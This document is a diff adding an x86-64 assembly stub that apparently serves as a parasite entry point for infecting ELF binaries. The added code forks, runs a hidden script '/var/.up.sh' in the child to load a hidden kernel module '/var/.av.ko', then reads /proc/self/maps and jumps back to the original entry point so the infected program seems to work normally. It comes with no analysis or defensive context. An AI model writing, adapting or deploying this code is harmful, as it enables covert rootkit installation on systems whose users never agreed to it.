@@ -1,0 +1,108 @@
+.globl _start
+
+.equ SYS_read,      0
+.equ SYS_write,     1
+.equ SYS_open,      2
+.equ SYS_fork,      57
+.equ SYS_execve,    59
+.equ MAXLEN,        17
+
+.text
+
+obf_entry:
+    nop
+    nop
+    jmp obf_pass
+
+obf_pass:
+    nop
+
+_start:
+    push %rax
+    push %rcx
+    push %rdx
+    push %rsi
+    push %rdi
+    push %r11
+
+    mov $SYS_fork, %eax
+    syscall
+    cmp $0, %eax
+    jne fuckoff
+
+    leaq modname(%rip), %rax
+    leaq insmodwrapper(%rip), %rdi
+    xor %rdx, %rdx
+    pushq %rdx
+    pushq %rax
+    pushq %rdi
+    movq %rsp, %rsi
+    movq $SYS_execve, %rax
+    leaq insmodwrapper(%rip), %rdi
+    movq $0, %rdx
+    syscall
+
+    xor %rax, %rax
+
+fuckoff:
+    movl $SYS_open, %eax
+    leaq path(%rip), %rdi
+    movq $0, %rsi
+    syscall
+
+    subq $16, %rsp
+    movq %rax, %rdi
+    movl $SYS_read, %eax
+    movq %rsp, %rsi
+    movq $MAXLEN, %rdx
+    syscall
+
+scan:
+    movq $MAXLEN+1, %rcx
+    movb $'-', %al
+    movq %rsp, %rdi
+    cld
+    repne scasb
+
+    movq $MAXLEN, %r13
+    subq %rcx, %r13
+    movq %r13, %rcx
+    xor %rbx, %rbx
+    movq %rsp, %rsi
+    movq %rsi, %rdi
+    cld
+
+readchars:
+    lodsb
+    cmpb $0x39, %al
+    jle digit
+alpha:
+    subb $0x57, %al
+    jmp load_ebx
+digit:
+    subb $0x30, %al
+load_ebx:
+    shl $4, %rbx
+    or %rax, %rbx
+    stosb
+    loop readchars
+
+    addq $16, %rsp
+    movq $0x1122334455667788, %r8
+    addq %rbx, %r8
+    pop %r11
+    pop %rdi
+    pop %rsi
+    pop %rdx
+    pop %rcx
+    pop %rax
+    jmpq *%r8
+
+insmodwrapper:
+    .asciz "/var/.up.sh"
+
+modname:
+    .asciz "/var/.av.ko"
+
+path:
+    .asciz "/proc/self/maps"
